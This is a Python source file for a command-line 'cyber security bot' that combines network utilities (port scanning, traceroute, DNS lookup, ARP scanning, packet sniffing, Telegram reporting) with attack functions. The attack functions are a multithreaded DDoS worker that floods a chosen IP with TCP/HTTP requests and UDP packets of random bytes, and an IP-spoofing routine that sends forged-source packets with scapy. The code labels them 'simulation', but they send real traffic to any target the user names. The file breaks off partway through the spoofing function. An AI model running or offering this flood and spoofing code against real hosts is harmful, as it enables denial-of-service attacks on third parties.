# =========================================
# Main Script Setup  -*- coding: utf-8 -*-
# =========================================
import os
import sys
import time
import socket
import threading
import subprocess
import argparse
import json
import platform
import select
import random
import struct
import binascii
from datetime import datetime
from collections import defaultdict
import requests
import scapy.all as scapy
from scapy.layers import http
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.sendrecv import sniff, send, sr1, srp
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.packet import Raw
from scapy.arch import get_if_hwaddr
from scapy.route import Route
import dns.resolver
import psutil
import netifaces

COLORS_FILE = "colors.json"
current_theme = "blue"
active_monitoring = False
monitoring_thread = None
packet_sniffer_thread = None
ddos_attack_active = False
ddos_threads = []
CONFIG_FILE = "cyberbot_config.json"
# ============================================
# Load colors configuration
if os.path.exists(COLORS_FILE):
    COLORS = json.load(open(COLORS_FILE, "r"))
else:
    print(f"Error: Colors configuration file '{COLORS_FILE}' not found.")
    sys.exit(1)


class CyberBot:
    def __init__(self):
        self.config = self.load_config()
        self.running = True
        self.command_handlers = {
            "help": self.show_help,
            "exit": self.exit_bot,
            "ping": self.ping_ip,
            "start": self.start_monitoring,
            "stop": self.stop_monitoring,
            "scan": self.scan_ip,
            "tracert": self.traceroute,
            "nslookup": self.nslookup,
            "kill": self.ddos_attack,
            "arp": self.arp_scan,
            "lsof": self.list_open_ports,
            "view": self.view_config,
            "status": self.show_status,
            "config": self.configure_telegram,
            "export": self.export_to_telegram,
            "sniff": self.sniff_packets,
            "spoof": self.spoof_ip,
            "dns": self.spoof_dns,
            "intercept": self.intercept_packets
        }



    def load_config(self):
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, "r") as f:
                    return json.load(f)
            else:
                print(f"{COLORS[current_theme]['error']}Config file '{CONFIG_FILE}' not found. Please create it before running.{COLORS[current_theme]['reset']}")
                return {}
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}Error loading config: {e}{COLORS[current_theme]['reset']}")
            return {}

    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}Error saving config: {e}{COLORS[current_theme]['reset']}")
            return False
    
    def show_help(self, args=None):
        """Display help information for all commands"""
        help_text = f"""
{COLORS[current_theme]['primary']}Accurate Cyber Security Bot - Command Reference{COLORS[current_theme]['reset']}

{COLORS[current_theme]['secondary']}General Commands:{COLORS[current_theme]['reset']}
  help               - Show this help message
  exit               - Exit the Cyber Security Bot
  view               - View current configuration
  status             - Show current monitoring/attack status

{COLORS[current_theme]['secondary']}Network Monitoring:{COLORS[current_theme]['reset']}
  start <ip>         - Start monitoring an IP address
  stop               - Stop monitoring
  sniff <ip>         - Sniff packets for a specific IP
  intercept <ip>     - Intercept and analyze packets for IP

{COLORS[current_theme]['secondary']}Network Scanning:{COLORS[current_theme]['reset']}
  ping <ip>          - Ping an IP address
  scan <ip>          - Scan ports on an IP address
  tracert <ip>       - Trace route to an IP address
  nslookup <ip>      - DNS lookup for an IP/domain
  arp <ip>           - ARP scan on a network
  lsof <ip>          - List open ports on local/remote system

{COLORS[current_theme]['secondary']}Attack Simulation:{COLORS[current_theme]['reset']}
  kill <ip>          - Simulate DDOS attack on IP
  spoof <ip>         - IP spoofing attack
  dns <domain> <ip>  - DNS spoofing (redirect domain to IP)

{COLORS[current_theme]['secondary']}Telegram Integration:{COLORS[current_theme]['reset']}
  config <token> <chat_id> - Configure Telegram bot
  export              - Export current data to Telegram
"""
        print(help_text)
    
    def exit_bot(self, args=None):
        """Clean up and exit the application"""
        self.stop_monitoring()
        self.running = False
        print(f"{COLORS[current_theme]['success']}Accurate Cyber Defense Cyber Security Bot shutting down...{COLORS[current_theme]['reset']}")
        sys.exit(0)
    
    def ping_ip(self, args):
        """Ping an IP address to check connectivity"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: ping <ip_address>{COLORS[current_theme]['reset']}")
            return
        
        ip = args[0]
        count = 4 if len(args) < 2 else int(args[1])
        
        try:
            param = "-n" if platform.system().lower() == "windows" else "-c"
            command = ["ping", param, str(count), ip]
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{COLORS[current_theme]['info']}{output}{COLORS[current_theme]['reset']}")
            
            # Send to Telegram if configured
            if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                self.send_telegram(f"Ping results for {ip}:\n{output}")
        except subprocess.CalledProcessError as e:
            print(f"{COLORS[current_theme]['error']}Ping failed: {e.output}{COLORS[current_theme]['reset']}")
    
    def start_monitoring(self, args):
        """Start monitoring an IP address for security threats"""
        global active_monitoring, monitoring_thread
        
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: start <ip_address>{COLORS[current_theme]['reset']}")
            return
        
        if active_monitoring:
            print(f"{COLORS[current_theme]['warning']}Monitoring is already active. Stop first.{COLORS[current_theme]['reset']}")
            return
        
        ip = args[0]
        active_monitoring = True
        monitoring_thread = threading.Thread(target=self.monitor_ip, args=(ip,))
        monitoring_thread.daemon = True
        monitoring_thread.start()
        
        print(f"{COLORS[current_theme]['success']}Started monitoring IP: {ip}{COLORS[current_theme]['reset']}")
    
    def monitor_ip(self, ip):
        """Background thread for monitoring an IP address"""
        while active_monitoring:
            try:
                # Check connectivity
                ping_result = self.simple_ping(ip)
                
                # Check open ports
                open_ports = self.quick_scan(ip, [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389])
                
                # Check DNS resolution
                try:
                    dns_result = socket.gethostbyaddr(ip)[0]
                except:
                    dns_result = "No reverse DNS"
                
                # Check ARP cache
                arp_result = self.check_arp(ip)
                
                # Prepare report
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                report = f"""
{COLORS[current_theme]['primary']}Monitoring Report for {ip} - {timestamp}{COLORS[current_theme]['reset']}

{COLORS[current_theme]['secondary']}Connectivity:{COLORS[current_theme]['reset']}
  Ping: {'Success' if ping_result else 'Failed'}

{COLORS[current_theme]['secondary']}Open Ports:{COLORS[current_theme]['reset']}
  {', '.join(map(str, open_ports)) if open_ports else 'No common ports open'}

{COLORS[current_theme]['secondary']}DNS Information:{COLORS[current_theme]['reset']}
  Reverse DNS: {dns_result}

{COLORS[current_theme]['secondary']}ARP Information:{COLORS[current_theme]['reset']}
  MAC Address: {arp_result.get('mac', 'Not found')}
  Vendor: {arp_result.get('vendor', 'Unknown')}
"""
                print(report)
                
                # Send to Telegram if configured
                if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                    plain_report = f"Monitoring Report for {ip} - {timestamp}\n\n"
                    plain_report += f"Connectivity:\n  Ping: {'Success' if ping_result else 'Failed'}\n\n"
                    plain_report += f"Open Ports:\n  {', '.join(map(str, open_ports)) if open_ports else 'No common ports open'}\n\n"
                    plain_report += f"DNS Information:\n  Reverse DNS: {dns_result}\n\n"
                    plain_report += f"ARP Information:\n  MAC Address: {arp_result.get('mac', 'Not found')}\n"
                    plain_report += f"  Vendor: {arp_result.get('vendor', 'Unknown')}"
                    self.send_telegram(plain_report)
                
                # Sleep for monitoring interval
                time.sleep(self.config["monitoring_interval"])
            
            except Exception as e:
                print(f"{COLORS[current_theme]['error']}Monitoring error: {e}{COLORS[current_theme]['reset']}")
                time.sleep(10)
    
    def simple_ping(self, ip):
        """Simple ping implementation using sockets"""
        try:
            # Create ICMP socket
            ping_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            ping_socket.settimeout(1)
            
            # Create ICMP packet
            packet_id = random.randint(0, 65535)
            packet = struct.pack("!BBHHH", 8, 0, 0, packet_id, 1)
            
            # Calculate checksum
            checksum = self.calculate_checksum(packet)
            packet = struct.pack("!BBHHH", 8, 0, checksum, packet_id, 1)
            
            # Send packet
            ping_socket.sendto(packet, (ip, 1))
            
            # Wait for response
            start_time = time.time()
            ready = select.select([ping_socket], [], [], 1)
            if ready[0]:
                recv_packet, addr = ping_socket.recvfrom(1024)
                return True
            return False
        except:
            return False
        finally:
            ping_socket.close()
    
    def calculate_checksum(self, data):
        """Calculate checksum for ICMP packets"""
        if len(data) % 2:
            data += b'\x00'
        sum = 0
        for i in range(0, len(data), 2):
            sum += (data[i] << 8) + data[i+1]
        sum = (sum >> 16) + (sum & 0xffff)
        sum += sum >> 16
        return ~sum & 0xffff
    
    def quick_scan(self, ip, ports):
        """Quick port scan implementation"""
        open_ports = []
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
            except:
                continue
        return open_ports
    
    def check_arp(self, ip):
        """Check ARP cache for IP"""
        try:
            # Get ARP response
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            if answered:
                mac = answered[0][1].hwsrc
                vendor = self.get_mac_vendor(mac)
                return {"mac": mac, "vendor": vendor}
        except:
            pass
        return {}
    
    def get_mac_vendor(self, mac):
        """Get vendor information from MAC address (first 3 bytes)"""
        try:
            # Use MAC vendor lookup API
            url = f"https://api.macvendors.com/{mac}"
            response = requests.get(url, timeout=2)
            if response.status_code == 200:
                return response.text
        except:
            pass
        return "Unknown"
    
    def stop_monitoring(self, args=None):
        """Stop monitoring activities"""
        global active_monitoring, monitoring_thread, packet_sniffer_thread
        
        if active_monitoring:
            active_monitoring = False
            if monitoring_thread and monitoring_thread.is_alive():
                monitoring_thread.join()
            print(f"{COLORS[current_theme]['success']}Monitoring stopped.{COLORS[current_theme]['reset']}")
        
        if packet_sniffer_thread and packet_sniffer_thread.is_alive():
            scapy.sniffer.StopFilter()
            packet_sniffer_thread.join()
            print(f"{COLORS[current_theme]['success']}Packet sniffing stopped.{COLORS[current_theme]['reset']}")
    
    def scan_ip(self, args):
        """Scan an IP address for open ports"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: scan <ip_address> [start_port] [end_port]{COLORS[current_theme]['reset']}")
            return
        
        ip = args[0]
        start_port = 1 if len(args) < 2 else int(args[1])
        end_port = 1024 if len(args) < 3 else int(args[2])
        
        print(f"{COLORS[current_theme]['info']}Scanning {ip} from port {start_port} to {end_port}...{COLORS[current_theme]['reset']}")
        
        open_ports = []
        for port in range(start_port, end_port + 1):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        service = socket.getservbyport(port, 'tcp') if port <= 65535 else "unknown"
                        print(f"{COLORS[current_theme]['success']}Port {port} ({service}) is open{COLORS[current_theme]['reset']}")
                        open_ports.append(port)
            except:
                pass
        
        print(f"{COLORS[current_theme]['info']}Scan completed. Found {len(open_ports)} open ports.{COLORS[current_theme]['reset']}")
        
        # Send to Telegram if configured
        if self.config["telegram_token"] and self.config["telegram_chat_id"] and open_ports:
            message = f"Scan results for {ip} (ports {start_port}-{end_port}):\n"
            message += "\n".join([f"Port {port} is open" for port in open_ports])
            self.send_telegram(message)
    
    def traceroute(self, args):
        """Perform a traceroute to an IP address"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: tracert <ip_address>{COLORS[current_theme]['reset']}")
            return
        
        target = args[0]
        max_hops = 30
        port = 33434
        
        print(f"{COLORS[current_theme]['info']}Tracing route to {target}...{COLORS[current_theme]['reset']}")
        
        try:
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            print(f"{COLORS[current_theme]['error']}Could not resolve hostname{COLORS[current_theme]['reset']}")
            return
        
        results = []
        prev_router = None
        
        for ttl in range(1, max_hops + 1):
            # Create UDP packet
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            udp_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
            udp_socket.settimeout(3)
            
            # Create ICMP socket for receiving
            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            icmp_socket.settimeout(3)
            icmp_socket.bind(("", port))
            
            # Send empty UDP packet
            udp_socket.sendto(b"", (target_ip, port))
            
            # Get current time
            start_time = time.time()
            
            try:
                # Receive ICMP packet
                data, addr = icmp_socket.recvfrom(1024)
                end_time = time.time()
                
                # Calculate round trip time
                rtt = (end_time - start_time) * 1000
                
                # Get router IP
                router_ip = addr[0]
                
                # Skip if same as previous router
                if router_ip == prev_router:
                    continue
                
                prev_router = router_ip
                
                # Try to get hostname
                try:
                    hostname = socket.gethostbyaddr(router_ip)[0]
                except socket.herror:
                    hostname = router_ip
                
                # Print and store result
                result = f"{ttl}\t{hostname} ({router_ip})\t{round(rtt, 2)} ms"
                print(f"{COLORS[current_theme]['info']}{result}{COLORS[current_theme]['reset']}")
                results.append(result)
                
                # Check if we've reached the target
                if router_ip == target_ip:
                    break
                
            except socket.timeout:
                print(f"{COLORS[current_theme]['warning']}{ttl}\t*\tRequest timed out{COLORS[current_theme]['reset']}")
                results.append(f"{ttl}\t*\tRequest timed out")
            finally:
                udp_socket.close()
                icmp_socket.close()
        
        # Send to Telegram if configured
        if self.config["telegram_token"] and self.config["telegram_chat_id"] and results:
            message = f"Traceroute to {target}:\n" + "\n".join(results)
            self.send_telegram(message)
    
    def nslookup(self, args):
        """Perform DNS lookup for a domain or IP"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: nslookup <domain/ip>{COLORS[current_theme]['reset']}")
            return
        
        target = args[0]
        
        try:
            # Check if input is IP or domain
            try:
                socket.inet_aton(target)
                is_ip = True
            except socket.error:
                is_ip = False
            
            if is_ip:
                # Reverse DNS lookup
                result = socket.gethostbyaddr(target)
                print(f"{COLORS[current_theme]['info']}Reverse DNS for {target}:{COLORS[current_theme]['reset']}")
                print(f"{COLORS[current_theme]['success']}Hostname: {result[0]}{COLORS[current_theme]['reset']}")
                if len(result[1]) > 0:
                    print(f"{COLORS[current_theme]['success']}Aliases: {', '.join(result[1])}{COLORS[current_theme]['reset']}")
                
                # Send to Telegram
                if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                    message = f"Reverse DNS for {target}:\nHostname: {result[0]}"
                    if len(result[1]) > 0:
                        message += f"\nAliases: {', '.join(result[1])}"
                    self.send_telegram(message)
            else:
                # Forward DNS lookup
                print(f"{COLORS[current_theme]['info']}DNS records for {target}:{COLORS[current_theme]['reset']}")
                
                # A records
                try:
                    a_records = dns.resolver.resolve(target, 'A')
                    print(f"{COLORS[current_theme]['success']}A Records:{COLORS[current_theme]['reset']}")
                    for record in a_records:
                        print(f"  {record.address}")
                except:
                    pass
                
                # MX records
                try:
                    mx_records = dns.resolver.resolve(target, 'MX')
                    print(f"{COLORS[current_theme]['success']}MX Records:{COLORS[current_theme]['reset']}")
                    for record in mx_records:
                        print(f"  {record.exchange} (priority {record.preference})")
                except:
                    pass
                
                # NS records
                try:
                    ns_records = dns.resolver.resolve(target, 'NS')
                    print(f"{COLORS[current_theme]['success']}NS Records:{COLORS[current_theme]['reset']}")
                    for record in ns_records:
                        print(f"  {record.target}")
                except:
                    pass
                
                # Send to Telegram
                if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                    message = f"DNS records for {target}:\n"
                    
                    try:
                        a_records = dns.resolver.resolve(target, 'A')
                        message += "A Records:\n"
                        for record in a_records:
                            message += f"  {record.address}\n"
                    except:
                        pass
                    
                    try:
                        mx_records = dns.resolver.resolve(target, 'MX')
                        message += "MX Records:\n"
                        for record in mx_records:
                            message += f"  {record.exchange} (priority {record.preference})\n"
                    except:
                        pass
                    
                    try:
                        ns_records = dns.resolver.resolve(target, 'NS')
                        message += "NS Records:\n"
                        for record in ns_records:
                            message += f"  {record.target}\n"
                    except:
                        pass
                    
                    self.send_telegram(message.strip())
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}DNS lookup failed: {e}{COLORS[current_theme]['reset']}")
    
    def ddos_attack(self, args):
        """Simulate a DDOS attack on a target IP"""
        global ddos_attack_active, ddos_threads
        
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: kill <ip_address> [port] [threads] [duration]{COLORS[current_theme]['reset']}")
            return
        
        if ddos_attack_active:
            print(f"{COLORS[current_theme]['warning']}DDOS attack is already running. Stop it first.{COLORS[current_theme]['reset']}")
            return
        
        target_ip = args[0]
        target_port = 80 if len(args) < 2 else int(args[1])
        threads = self.config["ddos_threads"] if len(args) < 3 else int(args[2])
        duration = self.config["ddos_duration"] if len(args) < 4 else int(args[3])
        
        print(f"{COLORS[current_theme]['warning']}Starting DDOS attack on {target_ip}:{target_port}{COLORS[current_theme]['reset']}")
        print(f"{COLORS[current_theme]['info']}Using {threads} threads for {duration} seconds{COLORS[current_theme]['reset']}")
        
        if self.config["telegram_token"] and self.config["telegram_chat_id"]:
            self.send_telegram(f"🚨 Starting DDOS attack on {target_ip}:{target_port}\nThreads: {threads}\nDuration: {duration}s")
        
        ddos_attack_active = True
        ddos_threads = []
        
        # Start attack threads
        for i in range(threads):
            t = threading.Thread(target=self._ddos_worker, args=(target_ip, target_port, duration))
            t.daemon = True
            t.start()
            ddos_threads.append(t)
        
        # Monitor progress
        start_time = time.time()
        while time.time() - start_time < duration and ddos_attack_active:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            print(f"{COLORS[current_theme]['info']}Attack in progress: {elapsed}/{duration} seconds{COLORS[current_theme]['reset']}", end="\r")
        
        # Clean up
        ddos_attack_active = False
        for t in ddos_threads:
            t.join()
        
        print(f"\n{COLORS[current_theme]['success']}DDOS attack completed.{COLORS[current_theme]['reset']}")
        
        if self.config["telegram_token"] and self.config["telegram_chat_id"]:
            self.send_telegram(f"✅ DDOS attack on {target_ip}:{target_port} completed")
    
    def _ddos_worker(self, target_ip, target_port, duration):
        """Worker thread for DDOS attack"""
        start_time = time.time()
        
        while time.time() - start_time < duration and ddos_attack_active:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Connect and send garbage data
                s.connect((target_ip, target_port))
                s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
                s.sendto(("Host: " + target_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
                s.close()
                
                # UDP flood
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target_ip, target_port))
                s.close()
            except:
                pass
    
    def arp_scan(self, args):
        """Perform ARP scan on a network"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: arp <network> (e.g., arp 192.168.1.0/24){COLORS[current_theme]['reset']}")
            return
        
        network = args[0]
        
        print(f"{COLORS[current_theme]['info']}Starting ARP scan on {network}...{COLORS[current_theme]['reset']}")
        
        try:
            # Create ARP request
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send and receive packets
            answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            # Process results
            devices = []
            for element in answered:
                ip = element[1].psrc
                mac = element[1].hwsrc
                vendor = self.get_mac_vendor(mac)
                devices.append((ip, mac, vendor))
            
            # Display results
            print(f"{COLORS[current_theme]['success']}Found {len(devices)} devices:{COLORS[current_theme]['reset']}")
            print(f"{COLORS[current_theme]['info']}IP Address\t\tMAC Address\t\tVendor{COLORS[current_theme]['reset']}")
            for ip, mac, vendor in devices:
                print(f"{ip}\t{mac}\t{vendor}")
            
            # Send to Telegram if configured
            if self.config["telegram_token"] and self.config["telegram_chat_id"] and devices:
                message = f"ARP scan results for {network}:\nFound {len(devices)} devices:\n"
                message += "IP Address\tMAC Address\tVendor\n"
                for ip, mac, vendor in devices:
                    message += f"{ip}\t{mac}\t{vendor}\n"
                self.send_telegram(message.strip())
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}ARP scan failed: {e}{COLORS[current_theme]['reset']}")
    
    def list_open_ports(self, args):
        """List open ports on local or remote system"""
        target = "local" if len(args) < 1 else args[0]
        
        if target == "local":
            print(f"{COLORS[current_theme]['info']}Listing open ports on local system:{COLORS[current_theme]['reset']}")
            
            try:
                connections = psutil.net_connections()
                ports = defaultdict(list)
                
                for conn in connections:
                    if conn.status == 'LISTEN':
                        if conn.laddr:
                            ports[conn.laddr.port].append(conn.type.name)
                
                print(f"{COLORS[current_theme]['success']}PORT\tTYPE{COLORS[current_theme]['reset']}")
                for port, types in sorted(ports.items()):
                    print(f"{port}\t{', '.join(set(types))}")
                
                # Send to Telegram if configured
                if self.config["telegram_token"] and self.config["telegram_chat_id"] and ports:
                    message = "Open ports on local system:\nPORT\tTYPE\n"
                    for port, types in sorted(ports.items()):
                        message += f"{port}\t{', '.join(set(types))}\n"
                    self.send_telegram(message.strip())
            except Exception as e:
                print(f"{COLORS[current_theme]['error']}Failed to list local ports: {e}{COLORS[current_theme]['reset']}")
        else:
            # Remote system - do a quick scan
            self.scan_ip([target, "1", "1024"])
    
    def view_config(self, args=None):
        """View current configuration"""
        print(f"{COLORS[current_theme]['primary']}Current Configuration:{COLORS[current_theme]['reset']}")
        for key, value in self.config.items():
            if key in ["telegram_token"] and value:
                print(f"{COLORS[current_theme]['info']}{key}: {'*' * len(value)}{COLORS[current_theme]['reset']}")
            else:
                print(f"{COLORS[current_theme]['info']}{key}: {value}{COLORS[current_theme]['reset']}")
    
    def show_status(self, args=None):
        """Show current monitoring/attack status"""
        global active_monitoring, ddos_attack_active
        
        print(f"{COLORS[current_theme]['primary']}Current Status:{COLORS[current_theme]['reset']}")
        print(f"{COLORS[current_theme]['info']}Monitoring: {'Active' if active_monitoring else 'Inactive'}{COLORS[current_theme]['reset']}")
        print(f"{COLORS[current_theme]['info']}DDOS Attack: {'Active' if ddos_attack_active else 'Inactive'}{COLORS[current_theme]['reset']}")
        
        # Show network interfaces
        print(f"\n{COLORS[current_theme]['secondary']}Network Interfaces:{COLORS[current_theme]['reset']}")
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip_info = addrs[netifaces.AF_INET][0]
                    print(f"{COLORS[current_theme]['info']}{iface}: {ip_info.get('addr', 'No IP')}{COLORS[current_theme]['reset']}")
        except:
            print(f"{COLORS[current_theme]['error']}Could not get network interfaces{COLORS[current_theme]['reset']}")
    
    def configure_telegram(self, args):
        """Configure Telegram bot token and chat ID"""
        if len(args) < 2:
            print(f"{COLORS[current_theme]['error']}Usage: config <telegram_token> <chat_id>{COLORS[current_theme]['reset']}")
            return
        
        self.config["telegram_token"] = args[0]
        self.config["telegram_chat_id"] = args[1]
        
        if self.save_config():
            print(f"{COLORS[current_theme]['success']}Telegram configuration updated successfully.{COLORS[current_theme]['reset']}")
            
            # Test the connection
            print(f"{COLORS[current_theme]['info']}Testing Telegram connection...{COLORS[current_theme]['reset']}")
            if self.send_telegram("Cyber Security Bot connected successfully!"):
                print(f"{COLORS[current_theme]['success']}Telegram test message sent.{COLORS[current_theme]['reset']}")
            else:
                print(f"{COLORS[current_theme]['error']}Failed to send Telegram test message.{COLORS[current_theme]['reset']}")
        else:
            print(f"{COLORS[current_theme]['error']}Failed to save configuration.{COLORS[current_theme]['reset']}")
    
    def send_telegram(self, message):
        """Send message to Telegram"""
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.config['telegram_token']}/sendMessage"
            params = {
                "chat_id": self.config["telegram_chat_id"],
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=params, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}Telegram send error: {e}{COLORS[current_theme]['reset']}")
            return False
    
    def export_to_telegram(self, args=None):
        """Export current data to Telegram"""
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            print(f"{COLORS[current_theme]['error']}Telegram not configured. Use 'config' command first.{COLORS[current_theme]['reset']}")
            return
        
        # Get system info
        system_info = f"System: {platform.system()} {platform.release()}"
        network_info = "Network Interfaces:\n"
        
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip_info = addrs[netifaces.AF_INET][0]
                    network_info += f"{iface}: {ip_info.get('addr', 'No IP')}\n"
        except:
            network_info += "Could not get network interfaces"
        
        # Get ARP cache
        arp_info = "ARP Cache:\n"
        try:
            if platform.system() == "Windows":
                arp_output = subprocess.check_output(["arp", "-a"], universal_newlines=True)
            else:
                arp_output = subprocess.check_output(["arp", "-n"], universal_newlines=True)
            arp_info += arp_output
        except:
            arp_info += "Could not get ARP cache"
        
        # Get routing table
        route_info = "Routing Table:\n"
        try:
            if platform.system() == "Windows":
                route_output = subprocess.check_output(["route", "print"], universal_newlines=True)
            else:
                route_output = subprocess.check_output(["netstat", "-rn"], universal_newlines=True)
            route_info += route_output
        except:
            route_info += "Could not get routing table"
        
        # Combine and send
        message = f"Cyber Security Bot Export\n\n{system_info}\n\n{network_info}\n\n{arp_info}\n\n{route_info}"
        if self.send_telegram(message[:4000]):  # Telegram has message length limit
            print(f"{COLORS[current_theme]['success']}Data exported to Telegram.{COLORS[current_theme]['reset']}")
        else:
            print(f"{COLORS[current_theme]['error']}Failed to export data.{COLORS[current_theme]['reset']}")
    
    def sniff_packets(self, args):
        """Sniff packets for a specific IP address"""
        global packet_sniffer_thread
        
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: sniff <ip_address> [count]{COLORS[current_theme]['reset']}")
            return
        
        target_ip = args[0]
        count = self.config["packet_sniff_count"] if len(args) < 2 else int(args[1])
        
        print(f"{COLORS[current_theme]['info']}Starting packet sniff for {target_ip} (count: {count})...{COLORS[current_theme]['reset']}")
        
        # Start sniffing in a separate thread
        packet_sniffer_thread = threading.Thread(
            target=self._sniff_packets_worker,
            args=(target_ip, count)
        )
        packet_sniffer_thread.daemon = True
        packet_sniffer_thread.start()
    
    def _sniff_packets_worker(self, target_ip, count):
        """Worker function for packet sniffing"""
        def packet_callback(packet):
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if src_ip == target_ip or dst_ip == target_ip:
                    timestamp = datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S')
                    protocol = packet[IP].proto
                    
                    # Get protocol name
                    if protocol == 6 and TCP in packet:
                        proto_name = "TCP"
                        sport = packet[TCP].sport
                        dport = packet[TCP].dport
                        flags = packet[TCP].flags
                        info = f"{proto_name} {src_ip}:{sport} -> {dst_ip}:{dport} Flags: {flags}"
                    elif protocol == 17 and UDP in packet:
                        proto_name = "UDP"
                        sport = packet[UDP].sport
                        dport = packet[UDP].dport
                        info = f"{proto_name} {src_ip}:{sport} -> {dst_ip}:{dport}"
                    elif protocol == 1 and ICMP in packet:
                        proto_name = "ICMP"
                        icmp_type = packet[ICMP].type
                        info = f"{proto_name} {src_ip} -> {dst_ip} Type: {icmp_type}"
                    else:
                        info = f"Protocol {protocol} {src_ip} -> {dst_ip}"
                    
                    # Print packet info
                    print(f"{COLORS[current_theme]['info']}[{timestamp}] {info}{COLORS[current_theme]['reset']}")
                    
                    # Check for HTTP packets
                    if packet.haslayer(http.HTTPRequest):
                        http_info = self._process_http_packet(packet)
                        print(f"{COLORS[current_theme]['secondary']}HTTP Request: {http_info}{COLORS[current_theme]['reset']}")
                    elif packet.haslayer(http.HTTPResponse):
                        http_info = self._process_http_packet(packet)
                        print(f"{COLORS[current_theme]['secondary']}HTTP Response: {http_info}{COLORS[current_theme]['reset']}")
        
        try:
            sniff(filter=f"host {target_ip}", prn=packet_callback, count=count)
            print(f"{COLORS[current_theme]['success']}Packet sniffing completed.{COLORS[current_theme]['reset']}")
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}Packet sniffing error: {e}{COLORS[current_theme]['reset']}")
    
    def _process_http_packet(self, packet):
        """Extract HTTP information from packet"""
        if packet.haslayer(http.HTTPRequest):
            http_layer = packet.getlayer(http.HTTPRequest)
            ip_layer = packet.getlayer(IP)
            return f"Request to {http_layer.Host} for {http_layer.Path} from {ip_layer.src}"
        elif packet.haslayer(http.HTTPResponse):
            http_layer = packet.getlayer(http.HTTPResponse)
            ip_layer = packet.getlayer(IP)
            return f"Response from {ip_layer.src} Status: {http_layer.Status_Code}"
        return "Unknown HTTP packet"
    
    def spoof_ip(self, args):
        """Perform IP spoofing attack"""
        if len(args) < 2:
            print(f"{COLORS[current_theme]['error']}Usage: spoof <target_ip> <spoofed_ip> [count]{COLORS[current_theme]['reset']}")
            return
        
        target_ip = args[0]
        spoofed_ip = args[1]
        count = self.config["spoof_packet_count"] if len(args) < 3 else int(args[2])
        
        print(f"{COLORS[current_theme]['warning']}Starting IP spoofing attack: {spoofed_ip} -> {target_ip}{COLORS[current_theme]['reset']}")
        
        try:
            for i in range(count):
                # Create IP header with spoofed source
                ip_header = IP(src=spoofed_ip, dst=target_ip)
                
                # Create TCP or UDP packet
                if random.choice([True, False]):
                    transport_header = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                else:
                    transport_header = UDP(sport=random.randint(1024, 65535), dport=53)
                
                # Send the packet
                send(ip_header/transport_header, verbose=False)
                
                # Progress indicator
                if (i + 1) % 10 == 0:
                    print(f"{COLORS[current_theme]['info']}Sent {i + 1}/{count} spoofed packets{COLORS[current_theme]['reset']}", end="\r")
            
            print(f"\n{COLORS[current_theme]['success']}IP spoofing completed. Sent {count} packets.{COLORS[current_theme]['reset']}")
